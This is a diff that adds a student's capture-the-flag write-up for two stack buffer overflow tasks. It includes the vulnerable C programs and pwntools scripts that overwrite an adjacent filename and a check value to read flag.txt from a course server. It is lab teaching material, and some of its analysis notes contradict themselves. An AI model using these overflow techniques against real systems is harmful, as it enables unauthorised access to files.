@@ -75,3 +75,168 @@ with open('badfile', 'wb') as f:
     f.write(content)
 ```
 
+### CTF - Week 5
+
+## Task 1
+
+#Checksec
+ * Architecture is x86 (Arch);
+ * There is no canary protecting the return address (Stack);
+ * The stack has execution permissions(NX);
+ * Binary Positions are not randomized (PIE);
+ * The are memory segments with permission to read,write and execute (RWX).
+
+#Program analysis
+ 
+ * mem.txt is opened by the program and saved in an array;
+ * buffer value is read from input;
+ * There is no buffer overflow;
+
+#Program Source Code 
+
+ ```c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    char meme_file[8] = "mem.txt\0";
+    char buffer[20];
+
+    printf("Try to unlock the flag.\n");
+    printf("Show me what you got:");
+    fflush(stdout);
+    scanf("%28s", &buffer);
+
+    printf("Echo %s\n", buffer);
+
+    printf("I like what you got!\n");
+    
+    FILE *fd = fopen(meme_file,"r");
+    
+    while(1){
+        if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
+            printf("%s", buffer);
+        } else {
+            break;
+        }
+    }
+
+
+    fflush(stdout);
+    
+    return 0;
+}
+
+ ```
+
+#Attack
+
+* Cause a buffer overflow on 'buffer' by inputing more than 20 byte (space it has initiliazed);
+* After inputing more than 20 bytes, write that you want the array with name of the file flag.txt;
+* This way we will open the file flag.txt
+
+The described attack is done in the last 3 lines in the Python script.
+
+#Python script
+
+``` python
+#!/usr/bin/python3
+from pwn import *
+
+DEBUG = False
+
+if DEBUG:
+    r = process('./program')
+else:
+    r = remote('ctf-fsi.fe.up.pt', 4003)
+
+r.recvuntil(b":")
+r.sendline(b"1234567890123456789\0flag.txt")
+r.interactive()
+
+``` 
+
+### Task 2
+
+## Checksec
+   * Checksec will display the same information of the program in the first task;
+
+## Program analysis
+    * The program has a new defense, a new buffer between the buffer we overflow and the target
+    * It will check if we change its value
+ 
+
+#Program
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    char meme_file[8] = "mem.txt\0";
+    char val[4] = "\xef\xbe\xad\xde";
+    char buffer[20];
+
+    printf("Try to unlock the flag.\n");
+    printf("Show me what you got:");
+    fflush(stdout);
+    scanf("%32s", &buffer);
+    
+    if(*(int*)val == 0xfefc2223) {
+        printf("I like what you got!\n");
+        
+        FILE *fd = fopen(meme_file,"r");
+        
+        while(1){
+            if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
+                printf("%s", buffer);
+            } else {
+                break;
+            }
+        }
+    } else {
+        printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
+    }
+
+    fflush(stdout);
+    
+    return 0;
+}
+```
+
+#Attack
+  * To bypass this all we need to do is input the correct sequence of characters in this new buffer, using the following script:
+
+##Python Script
+  ```python
+
+  #!/usr/bin/python3
+from pwn import *
+
+DEBUG = False
+
+if DEBUG:
+    r = process('./program')
+else:
+    r = remote('ctf-fsi.fe.up.pt', 4000)
+
+r.recvuntil(b":")
+teste = bytearray(b":1234567890123456790");
+
+teste.append(0x23);
+teste.append(0x22);
+teste.append(0xfc);
+teste.append(0xfe);
+
+teste.extend(b"flag.txt");
+
+r.sendline(teste);
+
+r.interactive()
+```
+
+## Result
+
+
+
